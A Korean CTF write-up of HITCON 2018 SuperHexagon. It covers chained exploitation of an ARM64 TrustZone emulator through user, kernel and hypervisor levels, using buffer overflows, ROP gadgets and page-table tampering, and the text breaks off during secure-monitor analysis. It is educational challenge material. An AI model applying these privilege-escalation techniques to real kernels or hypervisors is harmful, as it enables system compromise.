---
title: "HITCON CTF 2018 - SuperHexagon"
dateString: June 2024
draft: false
tags: ["HITCON 2018 SuperHexagon","Hypervisor Exploit", "Kernel Exploit", "Secure Monitor Exploit"]
weight: 30
date: 2024-06-25
categories: ["CTF"]
# cover:
    # image: ""
---

오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.

# Overview
# HITCON 2018 SuperHexagon 
## Overview
qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.
이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.
```C
...
+    ARMCPRegInfo hitcon_flag_reginfo[] = {
+        { .name = "FLAG_WORD_0", .state = ARM_CP_STATE_BOTH,
+          .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 0,
+          .access = PL0_RW,
+          .readfn = hitcon_flag_word_0_read, .writefn = arm_cp_write_ignore },
...
 typedef struct ARMCPUInfo {
     const char *name;
     void (*initfn)(Object *obj);
@@ -266,6 +387,7 @@
     { .name = "cortex-a57",         .initfn = aarch64_a57_initfn },
     { .name = "cortex-a53",         .initfn = aarch64_a53_initfn },
     { .name = "max",                .initfn = aarch64_max_initfn },
+    { .name = "hitcon",             .initfn = aarch64_hitcon_initfn },
     { .name = NULL }
 };
...
```
미리 정의된 시스템 레지스터를 읽어서 flag를 읽을 수 있다.
EL 마다 따로 리턴되는 flag가 다르다.
```C
1.  Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7
    For example, in aarch64, you may use:
            mrs x0, s3_3_c15_c12_0
            mrs x1, s3_3_c15_c12_1
                             .
                             .
                             .
            mrs x7, s3_3_c15_c12_7
    For first two stages, EL0 and EL1, `print_flag' functions are included.
    Make good use of them.
    qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this
    feature. See `qemu.patch' for more details.
```
README에서 어떤식으로 flag를 얻을 수 있는지 나와있다.
편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.
## EL0, Non-secure application
### EL0, ELF binary
bios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했고 이를 그대로 추출했다.
```C
void load_trustlet(char *base,int size)
{
...
  __dest = mmap((void *)0x0,__len,3,0,0,-1);
  iVar1 = tc_register_wsm(__dest,__len);
...
  memcpy(__dest,base,(long)size);
  iVar1 = tc_init_trustlet(iVar1,size);
  if (iVar1 == 0) {
    pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1);
    uVar2 = tc_register_wsm(pTVar3,0x1000);
...
```
tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다.
알려지지 않은 svc 번호를 이용한다.
TA_Bin은 arm32 thumb mode S-EL0 커스텀 바이너리로 보인다.
그리고 tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출해서 secure world쪽으로 key를 넘기는 로직이 구현되어있다.
### Vulnerability
```c
int scanf(char *__format,...)
{
  ...
  local_18 = in_x5;
  local_10 = in_x6;
  local_8 = in_x7;
  gets(input);
  local_100 = ap.__stack;
  pvStack_f8 = ap.__gr_top;
  uStack_e8 = CONCAT44(ap.__vr_offs,ap.__gr_offs);
  local_f0 = ap.__vr_top;
  iVar1 = vsscanf(input,__format,&local_100);
  return iVar1;
}
```
취약점은 단순 bof와 cmdtb에 대한 oob 였다.
print_flag 함수가 이미 있으니 그 함수로 뛰면 된다.
```c
[*] Switching to interactive mode
Flag (EL0): hitcon{this is flag 1 for EL0}

cmd> $ 
```
#### Code execution
```C
(*cmdtb[cmd])(buf,idx,len);
```
len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.
mprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2에서 항상 w^x를 보장하기에 불가능하다.
그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.
## Reverse engineering bootloader
부팅 초기에는 항상 최고 권한에서 시작하기에 무결성이 보장되어야한다고 생각했는데 실제로 나중에 익스플로잇을 다 끝내고 보니까 애초에 S-EL3의 경우엔 메모리에 올라오지 않고 flash rom 위에서 돌았다.

처음엔 부트로더쪽 배경지식이 없었기에 직접 qemu 코드를 읽어보면서 분석을 시작했다.
cpu는 처음에 reset을 수행하는데 이는 arm_load_kernel에서 볼 수 있었다.
```C
 	hwaddr flashsize = memmap[VIRT_FLASH].size / 2;
    hwaddr flashbase = memmap[VIRT_FLASH].base;
    create_one_flash("hitcon.flash0", flashbase, flashsize, bios_name, secure_sysmem);
    create_one_flash("hitcon.flash1", flashbase + flashsize, flashsize, NULL, sysmem);
```
여기서 memmap\[VIRT_FLASH\].base는 0이고 bios.bin을 여기에 로드한다.
```C
void arm_load_kernel(ARMCPU *cpu, MachineState *ms, struct arm_boot_info *info)
{
	...
    for (cs = first_cpu; cs; cs = CPU_NEXT(cs)) {
        qemu_register_reset(do_cpu_reset, ARM_CPU(cs));
        nb_cpus++;
    }
    ...
    /* Load the kernel.  */
    if (!info->kernel_filename || info->firmware_loaded) {
        arm_setup_firmware_boot(cpu, info);
    } else {
        arm_setup_direct_kernel_boot(cpu, info);
    }
  ...
  }
```
reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다.
IROM 내부에서 돌아가는 BL0를 에뮬레이션한 부분으로 이해했다.
```c
  ...
  sctlr_el3 = 0x30c50830;
  InstructionSynchronizationBarrier();
  vbar_el3 = 0x2000;
  InstructionSynchronizationBarrier();
  uVar1 = sctlr_el3;
  sctlr_el3 = uVar1 | 0x100a;
  InstructionSynchronizationBarrier();
  scr_el3 = 0x238;
  mdcr_el3 = 0x18000;
  ...
```
위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다.
시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.
### CPSR structure & gdbscript
![[/blog/Hitcon_2018_Superhexagon/f3aa540191ec4ca14c72cb878bcd003e.png]]
처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다.
이를 참고하여 cpsr을 확인하는 명령어 지원을 추가했다.
gdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.
```Python
gef> cpsr
EL3h| FIQ_MASKED | COND_8
```
초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.
### SCTLR_ELx structure
초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인하려면 M bit를 확인하면 된다.
![[/blog/Hitcon_2018_Superhexagon/5c404d7525a8647a30a51f42976236f1.png]]
arm 프로세서는 power up시에 cold reset이 수행된다.
메뉴얼에서 warm reset시 M bit가 0으로 세팅되며, 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 했다.
그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다.
![[/blog/Hitcon_2018_Superhexagon/f9ba4807b29236f4b72182e35beef3cc.png]]
실제로도 0으로 세팅되어있는 것을 볼 수 있다.
0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.
## Identifying exception handlers
### VBAR_ELx structure
exception이 일어나면 exception vector에 등록된 handler가 호출된다.
### Exception vector structure
![[/blog/Hitcon_2018_Superhexagon/37ba2f586ef0f39b47ea7eed4c2ce8c2.png]]
0x80 align 되어있다.
```C
        00000010 80  ff  00  10    adr        x0,0x2000
        00000014 00  c0  1e  d5    msr        vbar_el3 ,x0
        00000018 df  3f  03  d5    isb
```
이제 exception vector가 어떻게 생겼는지 알고 있다.
```C
+#define RAMLIMIT_GB 3
+#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024)
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```
앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다.
VIRT_FLASH 부터 적재되었고, physical address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.
ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다.
대충 어떤식으로 분석을 시도해야하는지 알게 되었다.
그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다.
일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.

부트로더가 어떤 동작을 하고 있는지 이제 이해할 수 있다.
```C
memset(0xE002000, 0, 0x202000)
memcpy(0xE000000, 0x002850, 0x68)
memcpy(0x40100000, 0x10000, 0x10000)
memcpy(0xE400000, 0x20000, 0x90000)
memcpy(0x40000000, 0xb0000, 0x10000)
```
아까 위에서 얘기했듯이 S-EL3는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다.
0x10000를 확인했더니 EL2 코드를 확인할 수 있었다.
![[/blog/Hitcon_2018_Superhexagon/e9e0b1a5ed7af29efb381c972df1b94d.png]]
물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다.
여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.
0xb0000에서 EL1을 확인할 수 있었다.
```c
ttbr0_el1 = 0xb1000;
ttbr1_el1 = 0xb4000;
tcr_el1 = 0x6080100010;
uVar1 = sctlr_el1;
sctlr_el1 = uVar1 | 1;
```
이런식으로 virtual memory system을 활성화하고 점프한다.
EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S-EL1에 해당할 것이다.
BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다.
그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.
### Extracting EL1, S-EL1, EL2 binaries
```C
#!/bin/sh
dd if=./bios.bin of=EL1.out bs=1024 skip=704 count=64
dd if=./bios.bin of=S-EL1.out bs=1024 skip=128 count=576
dd if=./bios.bin of=EL2.out bs=1024 skip=64 count=64
```
이제 EL1을 분석할 수 있게 되었다.
#### TCR_ELx structure & gdbscript
arm manual에서는 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 나와있다.
그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 한다.
![[/blog/Hitcon_2018_Superhexagon/bf81066fd0902de1dba3e4b2ad789558.png]]
메뉴얼보고 gdbscript로 파싱하는 스크립트를 작성해서 명령어를 추가했다.
![[/blog/Hitcon_2018_Superhexagon/3e84675b085fcf5812bbf9c423b10916.png]]
이러한 범위로 이용되는 것을 확인했다.
TTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다.
qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.
메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.
### Accessing secure memory & gdbscript
각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽지 못한다.
gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다.
근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다.
이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다.
전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.

다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다.
이를 바탕으로 직접 gdbscript를 작성하여 메모리 트리를 직접 확인하고 secure memory를 포함한 region을 재귀적으로 찾고 호스트 메모리에서 읽는 명령어 지원을 추가했다.
![[/blog/Hitcon_2018_Superhexagon/f44261bee663ddbd2e5ba43cb51214b9.png]]
정상적으로 secure memory를 확인할 수 있게 되었다.
이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.
## EL1, Non-secure Kernel
유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다.
bata24 gef에선 arm64에 대한 pagewalk가 지원된다.
VBAR을 확인하면 handler들이 보인다.
![[/blog/Hitcon_2018_Superhexagon/37ba2f586ef0f39b47ea7eed4c2ce8c2.png]]
system call은 synchronous 하고 lower exception level에서부터 발생하니 해당 부분을 확인해서 분석을 시작했다.
```C
...
  uVar11 = esr_el1;
  if (((uint)(uVar11 >> 26) & 0x3f) != 0b00010101) {
                    /* WARNING: Subroutine does not return */
    FUN_ffffffffc00091b0();
  }
...
```
EC field에 접근하고 있다.
![[/blog/Hitcon_2018_Superhexagon/0523118c2efb65bdb686270a2fc24f54.png]]
딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.
sys_read, sys_write는 0xffffffffc9000000을 읽거나 쓴다는 것을 알 수 있었다.
IPA는 0x3b000이며 PA는 0x9000000이다.
여긴 UART mmio 영역이다.
sys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.
### Vulnerability
```C
...
              phys = FUN_ffffffffc0008530(x1);
              for (usr_page = usr; usr_page < x1 + (long)usr; usr_page = usr_page + 0x1000) {
                FUN_ffffffffc0008864(usr_page,usr_page + (phys - (long)usr),(ulong)x2 & 0xffffffff );
...
```
ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없어서 이상함을 느꼈다.
다른 시스템 콜들의 경우 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다.

ropper로 쭉 뽑고 보다가 0xffffffffc0009130 가젯을 쓸 수 있을 것이라고 생각했다.
```C
     fffc0009130 fc  7f  40  f9    ldr        x28 ,[sp, #0xf8 ]
     fffc0009134 1c  41  18  d5    msr        sp_el0 ,x28
     fffc0009138 fc  77  4e  a9    ldp        x28 ,x29 ,[sp, #param_24 ]
     fffc000913c c0  03  5f  d6    ret
```
삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다.
![[/blog/Hitcon_2018_Superhexagon/f81b8606d985754ac8e51b84bec94050.png]]
handler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.
```C
     fffc0009430 f3  53  41  a9    ldp        x19 ,x20 ,[sp, #local_10 ]
     fffc0009434 fd  7b  c2  a8    ldp        x29 =>local_20 ,x30 ,[sp], #0x20
     fffc0009438 c0  03  5f  d6    ret
```
더 찾다가 위 가젯을 찾았다.
sp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다.
ret 1 byte overwrite → print_flag
```c
[*] Paused (press any to continue)
[*] Switching to interactive mode
Flag (EL1): hitcon{this is flag 2 for EL1}
```
### Gaining code execution
Arm manual 보면서 page descriptor도 봤었다.
![[/blog/Hitcon_2018_Superhexagon/3062a0126cbe537d237e93e411300ead.png]]
Two VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다.
VA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다.
이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다.
잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다.
PAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다.

혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없었다.
```Python
     fffc000000c 20  20  18  d5    msr        ttbr1_el1 ,x0
     fffc0000010 00  02  80  d2    mov        x0,#0x10
     fffc0000014 00  02  b0  f2    movk       x0,#0x8010 , LSL #16
     fffc0000018 00  0c  c0  f2    movk       x0,#0x60 , LSL #32
     fffc000001c 40  20  18  d5    msr        tcr_el1 ,x0
     fffc0000020 df  3f  03  d5    isb
     fffc0000024 00  10  38  d5    mrs        x0,sctlr_el1
     fffc0000028 00  00  40  b2    orr        x0,x0,#0x1
     fffc000002c 00  10  18  d5    msr        sctlr_el1 ,x0
     fffc0000030 df  3f  03  d5    isb
     fffc0000034 e0  87  62  b2    orr        x0,xzr ,#-0x40000000
     fffc0000038 41  fe  03  10    adr        x1,-0x3fff8000
     fffc000003c 00  00  01  8b    add        x0,x0,x1
     fffc0000040 00  00  1f  d6    br         x0=>LAB_ffffffff80008000
```
어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다.
근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.

그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다.
아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다.
그게 더 간단하지만 풀 때는 그 생각을 못했다.
![[/blog/Hitcon_2018_Superhexagon/608f926465b4c3187cacd39b49cdb2cc.png]]
0xffffffffc001e000 -> 0x1e000 -> 0x4001e000로 변환되니까 저 부분을 수정하면 된다.
  
0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다.
PTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸수 있다.
1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.
  
그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다.
그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다.
mprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다.

EL2는 물리 메모리로 접근하니 손으로 pagewalk해서 확인해보았다.
![[/blog/Hitcon_2018_Superhexagon/31b56e89303d73261e575a9371ec0a69.png]]
![[/blog/Hitcon_2018_Superhexagon/b44e6058081871ec76484838169c896b.png]]
mprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다.
bata24 gef를 이용하고 있는데 버그가 있다.
```Python
1) 0x0000000000034000-0x0000000000037000  0x0000000040034000-0x0000000040037000  0x3000        0x1000      3      [EL0/R-X EL1/R-X ACCESSED]
2) 0x0000000000036000-0x000000000003b000  0x0000000040036000-0x000000004003b000  0x5000       0x1000      5      [EL0/RWX EL1/RWX ACCESSED]
```
1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다.
2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다.
gef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다.
실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.
임의 쉘코드 실행을 만들었으니 이제 EL2를 보면 된다.
## EL2, Virtual machine monitor
커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다.
원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다.
이 문제에선 Type 1 hypervisor를 채택한 구조다.
만약 Type 2 구조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.
```C
...
  if (EC_ == 0b00010110) {
    if (x0 == 1) {
      x1 = HVC_handler(x1,saved_reg[2],saved_reg[2],saved_reg[3]);
    }
    else {
      x0 = -1;
    }
  }
  else if (EC_ == 0b00010111) {
    if (x0 == 0x83000003) {
      if (x1 < 0x3c001) {
        x0 = SMC_handler(0x83000003,x1 + 0x40000000);
      }
      else {
        x0 = -1;
      }
    }
    else {
      x0 = SMC_handler(x0,x1);
...
```
이전에 spS-EL = 0으로 해주고 위 함수로 점프한다.
EL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다.
EL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.
### Vulnerability
```C
...
  if (x1 < 0x3c000) {
                    /* x1 < 0xc000 and must not be writable */
    if ((x1 < 0xc000) && (((uint)x2 >> 7 & 1) != 0)) {
      FUN_4010009c(s__[VMM]_try_to_map_writable_pages_40102130);
      FUN_401006a8();
      FUN_40100774();
    }
    else {
                    /* (el0/el1 exec) and (no write) */
      if ((x2 & 0x40000000000080) != 0x80) {
                    /* ??? */
        puVar1 = (undefined *)(x1 + 0x40000000 | x2);
        *(undefined **)(&DAT_40107000 + (idx_addr + (x1 >> 21) * 0x200) * 8) = 
  ...
```
HVC handler를 분석하다가 얼마 안돼서 뭔가 이상함을 발견했다.
애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 영향을 주면 안된다는 것을 깨달았다.
그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다.
근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다.

하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.

마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.
1) EL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다.
2) hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다.
3) EL2 shellcode를 EL2 0x40102000에 복사한다.
```c
[*] Switching to interactive mode
hitcon{this is flag 3 for EL2}
\x00[*] Got EOF while reading in interactive
```
gef arm64 pagewalk는 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인해야한다.
pull request 보내려 했는데 나중에 보내야겠다.
## Exploring the Secure world
Normal world의 최고 exception level까진 도달했다.
non-secure physical memory의 모든 부분이 제어 가능하다.
이제 secure world로 넘어가야한다.

전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 공부했었다.
리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다.
ARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 있다.
### Analyzing the secure monitor
qemu에서 32bit 디버깅을 지원하지 않는다.
그래서 직접 빌드하고 run script를 수정했다.
기존에 직접 작성했던 secure memory를 읽는 기능을 이용해야해서 로컬에서 디버깅을 시작했다.
부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다.
거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다.
일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.

EL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다.
FUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다.
이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.
```c
...
        00000dfc 30  10  38  d5    mrs        x16 ,actlr_el1
        00000e00 0f  40  01  a9    stp        x15 ,x16 ,[x0, #0x10 ]
        00000e04 51  10  38  d5    mrs        x17 ,cpacr_el1
        00000e08 09  00  3a  d5    mrs        x9,csS-ELr_el1
...
        00000e6c 11  24  0a  a9    stp        x17 ,x9,[x0, #0xa0 ]
        00000e70 0a  9c  3b  d5    mrs        x10 ,pmcr_el0
        00000e74 0a  58  00  f9    str        x10 ,[x0, #0xb0 ]
        00000e78 c0  03  5f  d6    ret
```
아마 S-EL2는 구현되지 않아서 최대 S-EL1까지의 레지스터만 저장하는 것으로 보인다.
  
전에 trustzone 구현 메뉴얼을 살펴봤다.
그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요하다고 나와있었는데 그 부분이 구현된 부분이다.
그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다.
이런 구조를 염두에 두고 분석했더니니 쉽게 분석할 수 있었다.

x0 == 0x83000001는 secure → normal 이다.
그 위 부분들은 secure world에서 호출시에만 동작하니 일단 생략한다.
위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.
```c
                             sp = 0xe002210 
                             fill out general purpose regs
                             LAB_0000280c                                    XREF[2]:     00002418 (j) , 00002618 (j)   
        0000280c c0  f9  ff  97    bl         FUN_00000f0c                                     undefined FUN_00000f0c(undefined
        00002810 e5  03  1f  aa    mov        param_6 ,xzr
        00002814 e6  03  00  91    mov        param_7 ,sp
        00002818 cc  88  40  f9    ldr        x12 ,[param_7 , #0x110 ]
        0000281c bf  40  00  d5    msr        PState.SP,#0x0
        00002820 9f  01  00  91    mov        sp,x12
        00002824 10  40  3e  d5    mrs        x16 ,spsr_el3
        00002828 31  40  3e  d5    mrs        x17 ,elr_el3
        0000282c 12  11  3e  d5    mrs        x18 ,scr_el3
        00002830 d0  c4  11  a9    stp        x16 ,x17 ,[param_7 , #0x118 ]
		...
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다.
PState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.
```c
        00000bb4 fd  7b  bf  a9    stp        x29 ,x30 ,[sp, #local_10 ]!
        00000bb8 fd  03  00  91    mov        x29 ,sp
        00000bbc 38  ff  ff  97    bl         get_secure_mem                                   world_ctx * get_secure_mem(uint6
        00000bc0 bf  41  00  d5    msr        PState.SP,#0x1
        00000bc4 1f  00  00  91    mov        sp,x0
        00000bc8 bf  40  00  d5    msr        PState.SP,#0x0
        00000bcc fd  7b  c1  a8    ldp        x29 ,x30 ,[sp], #0x10
        00000bd0 c0  03  5f  d6    ret
```
여기서 sp_elxh를 세팅한다.
아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.
```c
        00000fa8 f1  03  00  91    mov        x17 ,sp
        00000fac bf  41  00  d5    msr        PState.SP,#0x1
        00000fb0 f1  8b  00  f9    str        x17 ,[sp, #param_11 ]
        00000fb4 f2  83  40  f9    ldr        x18 ,[sp, #SCR_EL3 ]
        00000fb8 f0  c7  51  a9    ldp        x16 ,x17 ,[sp, #SPSR_EL3 ]
        00000fbc 12  11  1e  d5    msr        scr_el3 ,x18
        00000fc0 10  40  1e  d5    msr        spsr_el3 ,x16
        00000fc4 31  40  1e  d5    msr        elr_el3 ,x17
        00000fc8 f5  ff  ff  17    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
그리고 마지막으로 여기서 world switch를 수행한다.
FUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.
  
아무리 봐도 악용할만한 취약점이 보이지 않았다.
그래서 S-EL0 부터 공격하기로 결정했다.
### Analyzing the Interaction Between the Normal World and the Secure World
#### EL0
```C
  iVar1 = tc_init_trustlet(iVar1,size);
  if (iVar1 == 0) {
    pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1);
    uVar2 = tc_register_wsm(pTVar3,0x1000);
  ...
```
위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다.
#### EL1
따로 처리 로직이 존재한다.
```C
  if (x8 == 0xff000005) {
    if ((x0 & 0xfff) == 0) {
      uVar1 = secure_monitor_call(0x83000005,x0 & 0xffffffff,x1 & 0xffffffff,0);
...
  else if (x8 == 0xff000006) {
    if ((x0 & 0xfff) == 0) {
      uVar1 = secure_monitor_call(0x83000006,x0,0,0);
```

실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.
#### EL2
```C
      if (x1 < 0x3c001) {
        x0 = SMC_handler(0x83000003,x1 + 0x40000000);
...
    else {
      x0 = SMC_handler(x0,x1);
...
```
IPA → PA를 해주고 Secure monitor로 마저 넘긴다.
#### S-EL3
```C
...
  if ((non_secure & 1) == 0) {
    if (x0 != 0x83000002) {
      if (x0 == 0x83000007) {
        save_el1_sysregs(0);
        pwVar2 = get_secure_mem(1);
        restore_sysregs(1);
        set_spelx(1);
        pwVar2->x0 = x1;
        return pwVar2;
      }
      FUN_00000d28();
      do_panic();
